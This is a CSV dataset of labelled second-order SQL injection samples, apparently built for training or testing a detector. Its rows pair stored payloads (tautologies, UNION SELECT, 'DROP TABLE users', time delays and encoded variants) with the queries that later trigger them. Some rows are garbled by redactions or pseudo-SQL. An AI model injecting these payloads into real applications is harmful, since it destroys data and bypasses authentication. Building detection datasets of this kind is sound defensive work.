store_id,scenario,step1_action,step1_payload,step1_query,step2_action,step2_payload,step2_query,encoding,storage_point,trigger_point,Label,attack_type
SO_00000,comment_field,STORE,admin'--,"INSERT INTO comments (user_id, comment) VALUES (123, 'admin'--')",RETRIEVE/EXECUTE,admin'--,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%admin'--%',none,user_comments table,admin dashboard query,1,second_order_injection
SO_00001,comment_field,STORE,' OR '1'='1,"INSERT INTO comments (user_id, comment) VALUES (123, '' OR '1'='1')",RETRIEVE/EXECUTE,' OR '1'='1,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%' OR '1'='1%',none,user_comments table,admin dashboard query,1,second_order_injection
SO_00002,comment_field,STORE,'; DROP TABLE users--,"INSERT INTO comments (user_id, comment) VALUES (123, ''; DROP TABLE users--')",RETRIEVE/EXECUTE,'; DROP TABLE users--,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%'; DROP TABLE users--%',none,user_comments table,admin dashboard query,1,second_order_injection
SO_00003,comment_field,STORE,"' UNION SELECT NULL, NULL--","INSERT INTO comments (user_id, comment) VALUES (123, '' UNION SELECT NULL, NULL--')",RETRIEVE/EXECUTE,"' UNION SELECT NULL, NULL--","SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%' UNION SELECT NULL, NULL--%'",none,user_comments table,admin dashboard query,1,second_order_injection
SO_00004,comment_field,STORE,1' AND '1'='1,"INSERT INTO comments (user_id, comment) VALUES (123, '1' AND '1'='1')",RETRIEVE/EXECUTE,1' AND '1'='1,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%1' AND '1'='1%',none,user_comments table,admin dashboard query,1,second_order_injection
SO_00005,comment_field,STORE,%27%20OR%20%271%27%3D%271,"INSERT INTO comments (user_id, comment) VALUES (123, '%27%20OR%20%271%27%3D%271')",RETRIEVE/EXECUTE,%27%20OR%20%271%27%3D%271,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%%27%20OR%20%271%27%3D%271%',URL/Hex/Base64,user_comments table,admin dashboard query,1,second_order_injection
SO_00006,comment_field,STORE,0x61646d696e272d2d,"INSERT INTO comments (user_id, comment) VALUES (123, '0x61646d696e272d2d')",RETRIEVE/EXECUTE,0x61646d696e272d2d,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%0x61646d696e272d2d%',URL/Hex/Base64,user_comments table,admin dashboard query,1,second_order_injection
SO_00007,comment_field,STORE,YWRtaW4nLS0=,"INSERT INTO comments (user_id, comment) VALUES (123, 'YWRtaW4nLS0=')",RETRIEVE/EXECUTE,YWRtaW4nLS0=,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%YWRtaW4nLS0=%',URL/Hex/Base64,user_comments table,admin dashboard query,1,second_order_injection
SO_00008,comment_field,STORE,\u0027 OR \u00271\u0027=\u00271,"INSERT INTO comments (user_id, comment) VALUES (123, '\u0027 OR \u00271\u0027=\u00271')",RETRIEVE/EXECUTE,\u0027 OR \u00271\u0027=\u00271,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%\u0027 OR \u00271\u0027=\u00271%',URL/Hex/Base64,user_comments table,admin dashboard query,1,second_order_injection
SO_00009,comment_field,STORE,'; WAITFOR DELAY '00:00:05'--,"INSERT INTO comments (user_id, comment) VALUES (123, ''; WAITFOR DELAY '00:00:05'--')",RETRIEVE/EXECUTE,'; WAITFOR DELAY '00:00:05'--,SELECT * FROM comments WHERE user_id=123 AND comment LIKE '%'; WAITFOR DELAY '00:00:05'--%',none,user_comments table,admin dashboard query,1,second_order_injection
SO_00010,profile_field,STORE,admin'--,UPDATE users SET bio='admin'--' WHERE id=456,RETRIEVE/EXECUTE,admin'--,SELECT * FROM users WHERE bio LIKE '%admin'--%',none,user_profile table,search query or profile display,1,second_order_injection
SO_00011,profile_field,STORE,' OR '1'='1,UPDATE users SET bio='' OR '1'='1' WHERE id=456,RETRIEVE/EXECUTE,' OR '1'='1,SELECT * FROM users WHERE bio LIKE '%' OR '1'='1%',none,user_profile table,search query or profile display,1,second_order_injection
SO_00012,profile_field,STORE,'; DROP TABLE users--,UPDATE users SET bio=''; DROP TABLE users--' WHERE id=456,RETRIEVE/EXECUTE,'; DROP TABLE users--,SELECT * FROM users WHERE bio LIKE '%'; DROP TABLE users--%',none,user_profile table,search query or profile display,1,second_order_injection
SO_00013,profile_field,STORE,"' UNION SELECT NULL, NULL--","UPDATE users SET bio='' UNION SELECT NULL, NULL--' WHERE id=456",RETRIEVE/EXECUTE,"' UNION SELECT NULL, NULL--","SELECT * FROM users WHERE bio LIKE '%' UNION SELECT NULL, NULL--%'",none,user_profile table,search query or profile display,1,second_order_injection
SO_00014,profile_field,STORE,1' AND '1'='1,UPDATE users SET bio='1' AND '1'='1' WHERE id=456,RETRIEVE/EXECUTE,1' AND '1'='1,SELECT * FROM users WHERE bio LIKE '%1' AND '1'='1%',none,user_profile table,search query or profile display,1,second_order_injection
SO_00015,profile_field,STORE,%27%20OR%20%271%27%3D%271,UPDATE users SET bio='%27%20OR%20%271%27%3D%271' WHERE id=456,RETRIEVE/EXECUTE,%27%20OR%20%271%27%3D%271,SELECT * FROM users WHERE bio LIKE '%%27%20OR%20%271%27%3D%271%',URL/Hex/Base64,user_profile table,search query or profile display,1,second_order_injection
SO_00016,profile_field,STORE,0x61646d696e272d2d,UPDATE users SET bio='0x61646d696e272d2d' WHERE id=456,RETRIEVE/EXECUTE,0x61646d696e272d2d,SELECT * FROM users WHERE bio LIKE '%0x61646d696e272d2d%',URL/Hex/Base64,user_profile table,search query or profile display,1,second_order_injection
SO_00017,profile_field,STORE,YWRtaW4nLS0=,UPDATE users SET bio='YWRtaW4nLS0=' WHERE id=456,RETRIEVE/EXECUTE,YWRtaW4nLS0=,SELECT * FROM users WHERE bio LIKE '%YWRtaW4nLS0=%',URL/Hex/Base64,user_profile table,search query or profile display,1,second_order_injection
SO_00018,profile_field,STORE,\u0027 OR \u00271\u0027=\u00271,UPDATE users SET bio='\u0027 OR \u00271\u0027=\u00271' WHERE id=456,RETRIEVE/EXECUTE,\u0027 OR \u00271\u0027=\u00271,SELECT * FROM users WHERE bio LIKE '%\u0027 OR \u00271\u0027=\u00271%',URL/Hex/Base64,user_profile table,search query or profile display,1,second_order_injection
SO_00019,profile_field,STORE,'; WAITFOR DELAY '00:00:05'--,UPDATE users SET bio=''; WAITFOR DELAY '00:00:05'--' WHERE id=456,RETRIEVE/EXECUTE,'; WAITFOR DELAY '00:00:05'--,SELECT * FROM users WHERE bio LIKE '%'; WAITFOR DELAY '00:00:05'--%',none,user_profile table,search query or profile display,1,second_order_injection
SO_00020,file_upload_metadata,STORE,admin'--,"INSERT INTO files (filename, uploader) VALUES ('admin'--.jpg', 'user123')",RETRIEVE/EXECUTE,admin'--,SELECT * FROM files WHERE filename='admin'--.jpg',none,file_metadata table,file listing query,1,second_order_injection
SO_00021,file_upload_metadata,STORE,' OR '1'='1,"INSERT INTO files (filename, uploader) VALUES ('' OR '1'='1.jpg', 'user123')",RETRIEVE/EXECUTE,' OR '1'='1,SELECT * FROM files WHERE filename='' OR '1'='1.jpg',none,file_metadata table,file listing query,1,second_order_injection
SO_00022,file_upload_metadata,STORE,'; DROP TABLE users--,"INSERT INTO files (filename, uploader) VALUES (''; DROP TABLE users--.jpg', 'user123')",RETRIEVE/EXECUTE,'; DROP TABLE users--,SELECT * FROM files WHERE filename=''; DROP TABLE users--.jpg',none,file_metadata table,file listing query,1,second_order_injection
SO_00023,file_upload_metadata,STORE,"' UNION SELECT NULL, NULL--","INSERT INTO files (filename, uploader) VALUES ('' UNION SELECT NULL, NULL--.jpg', 'user123')",RETRIEVE/EXECUTE,"' UNION SELECT NULL, NULL--","SELECT * FROM files WHERE filename='' UNION SELECT NULL, NULL--.jpg'",none,file_metadata table,file listing query,1,second_order_injection
SO_00024,file_upload_metadata,STORE,1' AND '1'='1,"INSERT INTO files (filename, uploader) VALUES ('1' AND '1'='1.jpg', 'user123')",RETRIEVE/EXECUTE,1' AND '1'='1,SELECT * FROM files WHERE filename='1' AND '1'='1.jpg',none,file_metadata table,file listing query,1,second_order_injection
SO_00025,file_upload_metadata,STORE,%27%20OR%20%271%27%3D%271,"INSERT INTO files (filename, uploader) VALUES ('%27%20OR%20%271%27%3D%271.jpg', 'user123')",RETRIEVE/EXECUTE,%27%20OR%20%271%27%3D%271,SELECT * FROM files WHERE filename='%27%20OR%20%271%27%3D%271.jpg',URL/Hex/Base64,file_metadata table,file listing query,1,second_order_injection
SO_00026,file_upload_metadata,STORE,0x61646d696e272d2d,"INSERT INTO files (filename, uploader) VALUES ('0x61646d696e272d2d.jpg', 'user123')",RETRIEVE/EXECUTE,0x61646d696e272d2d,SELECT * FROM files WHERE filename='0x61646d696e272d2d.jpg',URL/Hex/Base64,file_metadata table,file listing query,1,second_order_injection
SO_00027,file_upload_metadata,STORE,YWRtaW4nLS0=,"INSERT INTO files (filename, uploader) VALUES ('YWRtaW4nLS0=.jpg', 'user123')",RETRIEVE/EXECUTE,YWRtaW4nLS0=,SELECT * FROM files WHERE filename='YWRtaW4nLS0=.jpg',URL/Hex/Base64,file_metadata table,file listing query,1,second_order_injection
SO_00028,file_upload_metadata,STORE,\u0027 OR \u00271\u0027=\u00271,"INSERT INTO files (filename, uploader) VALUES ('\u0027 OR \u00271\u0027=\u00271.jpg', 'user123')",RETRIEVE/EXECUTE,\u0027 OR \u00271\u0027=\u00271,SELECT * FROM files WHERE filename='\u0027 OR \u00271\u0027=\u00271.jpg',URL/Hex/Base64,file_metadata table,file listing query,1,second_order_injection
SO_00029,file_upload_metadata,STORE,'; WAITFOR DELAY '00:00:05'--,"INSERT INTO files (filename, uploader) VALUES (''; WAITFOR DELAY '00:00:05'--.jpg', 'user123')",RETRIEVE/EXECUTE,'; WAITFOR DELAY '00:00:05'--,SELECT * FROM files WHERE filename=''; WAITFOR DELAY '00:00:05'--.jpg',none,file_metadata table,file listing query,1,second_order_injection
SO_00030,registration_email,STORE,admin'--,"INSERT INTO users (email, password) VALUES ('admin'[email]', 'hash')",RETRIEVE/EXECUTE,admin'--,SELECT * FROM users WHERE email='admin'[email]',none,users table,login authentication query,1,second_order_injection
SO_00031,registration_email,STORE,' OR '1'='1,"INSERT INTO users (email, password) VALUES ('' OR '1'='[email]', 'hash')",RETRIEVE/EXECUTE,' OR '1'='1,SELECT * FROM users WHERE email='' OR '1'='[email]',none,users table,login authentication query,1,second_order_injection
SO_00032,registration_email,STORE,'; DROP TABLE users--,"INSERT INTO users (email, password) VALUES (''; DROP TABLE [email]', 'hash')",RETRIEVE/EXECUTE,'; DROP TABLE users--,SELECT * FROM users WHERE email=''; DROP TABLE [email]',none,users table,login authentication query,1,second_order_injection
SO_00033,registration_email,STORE,"' UNION SELECT NULL, NULL--","INSERT INTO users (email, password) VALUES ('' UNION SELECT NULL, [email]', 'hash')",RETRIEVE/EXECUTE,"' UNION SELECT NULL, NULL--","SELECT * FROM users WHERE email='' UNION SELECT NULL, [email]'",none,users table,login authentication query,1,second_order_injection
SO_00034,registration_email,STORE,1' AND '1'='1,"INSERT INTO users (email, password) VALUES ('1' AND '1'='[email]', 'hash')",RETRIEVE/EXECUTE,1' AND '1'='1,SELECT * FROM users WHERE email='1' AND '1'='[email]',none,users table,login authentication query,1,second_order_injection
SO_00035,registration_email,STORE,%27%20OR%20%271%27%3D%271,"INSERT INTO users (email, password) VALUES ('[email]', 'hash')",RETRIEVE/EXECUTE,%27%20OR%20%271%27%3D%271,SELECT * FROM users WHERE email='[email]',URL/Hex/Base64,users table,login authentication query,1,second_order_injection
SO_00036,registration_email,STORE,0x61646d696e272d2d,"INSERT INTO users (email, password) VALUES ('[email]', 'hash')",RETRIEVE/EXECUTE,0x61646d696e272d2d,SELECT * FROM users WHERE email='[email]',URL/Hex/Base64,users table,login authentication query,1,second_order_injection
SO_00037,registration_email,STORE,YWRtaW4nLS0=,"INSERT INTO users (email, password) VALUES ('YWRtaW4nLS0=@mail.com', 'hash')",RETRIEVE/EXECUTE,YWRtaW4nLS0=,SELECT * FROM users WHERE email='YWRtaW4nLS0=@mail.com',URL/Hex/Base64,users table,login authentication query,1,second_order_injection
SO_00038,registration_email,STORE,\u0027 OR \u00271\u0027=\u00271,"INSERT INTO users (email, password) VALUES ('\u0027 OR \u00271\u0027=\[email]', 'hash')",RETRIEVE/EXECUTE,\u0027 OR \u00271\u0027=\u00271,SELECT * FROM users WHERE email='\u0027 OR \u00271\u0027=\[email]',URL/Hex/Base64,users table,login authentication query,1,second_order_injection
SO_00039,registration_email,STORE,'; WAITFOR DELAY '00:00:05'--,"INSERT INTO users (email, password) VALUES (''; WAITFOR DELAY '00:00:05'[email]', 'hash')",RETRIEVE/EXECUTE,'; WAITFOR DELAY '00:00:05'--,SELECT * FROM users WHERE email=''; WAITFOR DELAY '00:00:05'[email]',none,users table,login authentication query,1,second_order_injection
SO_00040,shopping_cart,STORE,admin'--,"INSERT INTO cart_items (product_name, price) VALUES ('admin'--', 99.99)",RETRIEVE/EXECUTE,admin'--,SELECT * FROM cart_items WHERE product_name='admin'--',none,cart_items table,checkout summary query,1,second_order_injection
SO_00041,shopping_cart,STORE,' OR '1'='1,"INSERT INTO cart_items (product_name, price) VALUES ('' OR '1'='1', 99.99)",RETRIEVE/EXECUTE,' OR '1'='1,SELECT * FROM cart_items WHERE product_name='' OR '1'='1',none,cart_items table,checkout summary query,1,second_order_injection
SO_00042,shopping_cart,STORE,'; DROP TABLE users--,"INSERT INTO cart_items (product_name, price) VALUES (''; DROP TABLE users--', 99.99)",RETRIEVE/EXECUTE,'; DROP TABLE users--,SELECT * FROM cart_items WHERE product_name=''; DROP TABLE users--',none,cart_items table,checkout summary query,1,second_order_injection
SO_00043,shopping_cart,STORE,"' UNION SELECT NULL, NULL--","INSERT INTO cart_items (product_name, price) VALUES ('' UNION SELECT NULL, NULL--', 99.99)",RETRIEVE/EXECUTE,"' UNION SELECT NULL, NULL--","SELECT * FROM cart_items WHERE product_name='' UNION SELECT NULL, NULL--'",none,cart_items table,checkout summary query,1,second_order_injection
SO_00044,shopping_cart,STORE,1' AND '1'='1,"INSERT INTO cart_items (product_name, price) VALUES ('1' AND '1'='1', 99.99)",RETRIEVE/EXECUTE,1' AND '1'='1,SELECT * FROM cart_items WHERE product_name='1' AND '1'='1',none,cart_items table,checkout summary query,1,second_order_injection
SO_00045,shopping_cart,STORE,%27%20OR%20%271%27%3D%271,"INSERT INTO cart_items (product_name, price) VALUES ('%27%20OR%20%271%27%3D%271', 99.99)",RETRIEVE/EXECUTE,%27%20OR%20%271%27%3D%271,SELECT * FROM cart_items WHERE product_name='%27%20OR%20%271%27%3D%271',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00046,shopping_cart,STORE,0x61646d696e272d2d,"INSERT INTO cart_items (product_name, price) VALUES ('0x61646d696e272d2d', 99.99)",RETRIEVE/EXECUTE,0x61646d696e272d2d,SELECT * FROM cart_items WHERE product_name='0x61646d696e272d2d',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00047,shopping_cart,STORE,YWRtaW4nLS0=,"INSERT INTO cart_items (product_name, price) VALUES ('YWRtaW4nLS0=', 99.99)",RETRIEVE/EXECUTE,YWRtaW4nLS0=,SELECT * FROM cart_items WHERE product_name='YWRtaW4nLS0=',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00048,shopping_cart,STORE,\u0027 OR \u00271\u0027=\u00271,"INSERT INTO cart_items (product_name, price) VALUES ('\u0027 OR \u00271\u0027=\u00271', 99.99)",RETRIEVE/EXECUTE,\u0027 OR \u00271\u0027=\u00271,SELECT * FROM cart_items WHERE product_name='\u0027 OR \u00271\u0027=\u00271',URL/Hex/Base64,cart_items table,checkout summary query,1,second_order_injection
SO_00049,shopping_cart,STORE,'; WAITFOR DELAY '00:00:05'--,"INSERT INTO cart_items (product_name, price) VALUES (''; WAITFOR DELAY '00:00:05'--', 99.99)",RETRIEVE/EXECUTE,'; WAITFOR DELAY '00:00:05'--,SELECT * FROM cart_items WHERE product_name=''; WAITFOR DELAY '00:00:05'--',none,cart_items table,checkout summary query,1,second_order_injection
SO_00050,comment_field_encoded,STORE_ENCODED,%27%20OR%201%3D1--,INSERT INTO user_comments table (data) VALUES ('%27%20OR%201%3D1--'),DECODE_EXECUTE,' OR 1=1--,SELECT * FROM user_comments table WHERE data=DECODE('%27%20OR%201%3D1--'),URL,user_comments table,admin dashboard query,1,second_order_encoded
SO_00051,comment_field_encoded,STORE_ENCODED,0x61646d696e272d2d,INSERT INTO user_comments table (data) VALUES ('0x61646d696e272d2d'),DECODE_EXECUTE,admin'--,SELECT * FROM user_comments table WHERE data=DECODE('0x61646d696e272d2d'),Hex,user_comments table,admin dashboard query,1,second_order_encoded
SO_00052,comment_field_encoded,STORE_ENCODED,YWRtaW4nLS0=,INSERT INTO user_comments table (data) VALUES ('YWRtaW4nLS0='),DECODE_EXECUTE,admin'--,SELECT * FROM user_comments table WHERE data=DECODE('YWRtaW4nLS0='),Base64,user_comments table,admin dashboard query,1,second_order_encoded
SO_00053,profile_field_encoded,STORE_ENCODED,%27%20OR%201%3D1--,INSERT INTO user_profile table (data) VALUES ('%27%20OR%201%3D1--'),DECODE_EXECUTE,' OR 1=1--,SELECT * FROM user_profile table WHERE data=DECODE('%27%20OR%201%3D1--'),URL,user_profile table,search query or profile display,1,second_order_encoded
SO_00054,profile_field_encoded,STORE_ENCODED,0x61646d696e272d2d,INSERT INTO user_profile table (data) VALUES ('0x61646d696e272d2d'),DECODE_EXECUTE,admin'--,SELECT * FROM user_profile table WHERE data=DECODE('0x61646d696e272d2d'),Hex,user_profile table,search query or profile display,1,second_order_encoded
SO_00055,profile_field_encoded,STORE_ENCODED,YWRtaW4nLS0=,INSERT INTO user_profile table (data) VALUES ('YWRtaW4nLS0='),DECODE_EXECUTE,admin'--,SELECT * FROM user_profile table WHERE data=DECODE('YWRtaW4nLS0='),Base64,user_profile table,search query or profile display,1,second_order_encoded
